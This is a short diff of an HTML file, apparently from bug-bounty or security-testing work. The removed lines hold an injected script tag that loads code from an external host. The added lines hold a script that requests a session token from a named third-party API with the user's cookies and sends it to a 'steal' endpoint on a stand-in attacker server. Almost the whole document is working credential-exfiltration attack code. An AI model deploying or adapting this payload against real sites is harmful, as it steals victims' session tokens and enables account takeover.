@@ -1,7 +1,10 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Audible SSRF Test</title>
-</head>
-<body>
-"><script src="https://js.rip/hr97hhjv6c"></script></html>
+<script>
+fetch("https://core.services.biorender.com/api/users/ws/token?issueCookie=true", {
+    credentials: "include"
+})
+.then(r => r.json())
+.then(data => {
+    // Exfiltrate the sensitive token to attacker server
+    fetch("https://yourserver.com/steal?d=" + btoa(JSON.stringify(data)));
+});
+</script>
